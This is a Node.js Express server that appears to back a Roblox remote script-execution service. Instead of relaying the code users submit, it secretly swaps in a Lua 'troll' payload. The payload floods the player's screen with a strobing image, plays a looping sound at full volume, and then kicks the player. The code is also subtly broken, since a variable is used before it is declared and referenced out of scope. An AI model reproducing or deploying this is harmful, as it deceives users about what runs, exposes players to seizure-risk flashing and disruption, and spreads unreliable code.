const express = require("express");
const { EventEmitter } = require("events");

const app = express();
const events = new EventEmitter();
const EVENT = "RemoteEvent";

app.use(express.json());

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

function generateGibberish(length = 16) {
  const chars = "你好世界𓂀𒐫ÆØµΔЖѬ()";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

app.post("/executeRequest", (req, res) => {
  const { username, code } = req.body;
  if (!username || !code) return res.sendStatus(400);

  console.log(`Execute request from: ${username}`);
   console.log(username, trollPayload);
  const reason = generateGibberish();

const trollPayload = `
local function generateGibberish(length)
	local chars = {"你","好","世","界","𓂀","𒐫","Æ","Ø","µ","Δ","Ж","Ѭ","(",")"}
	local result = ""
	for i = 1, length do
		result = result .. chars[math.random(1, #chars)]
	end
	return result
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Make sure we don’t add duplicate
if not PlayerGui:FindFirstChild("Screamer") then
	local screamerGui = Instance.new("ScreenGui")
	screamerGui.Name = "Screamer"
	screamerGui.ResetOnSpawn = false
	screamerGui.Parent = PlayerGui

	local img = Instance.new("ImageLabel")
	img.Image = "http://www.roblox.com/asset/?id=16635097419"
	img.Size = UDim2.new(1, 0, 1, 0)
	img.BackgroundTransparency = 1
	img.ImageTransparency = 0
	img.Parent = screamerGui

	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://6018028320"
	sound.Volume = 10
	sound.Looped = true
	sound.Parent = screamerGui
	sound:Play()

	-- Optional: Flashing effect
	spawn(function()
		while true do
			img.ImageTransparency = 0
			wait(0.05)
			img.ImageTransparency = 1
			wait(0.05)
		end
	end)

	-- Kick after delay
	task.delay(3, function()
		LocalPlayer:Kick(generateGibberish(16))
	end)
end

`;

  events.emit(EVENT, { username, code: trollPayload });
  res.sendStatus(200);
});

app.get("/fetchExecuteRequests", (req, res) => {
  events.once(EVENT, ({ username, code }) => {
    res.json({ username, trollPayload });
	  console.log(username, trollPayload);
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
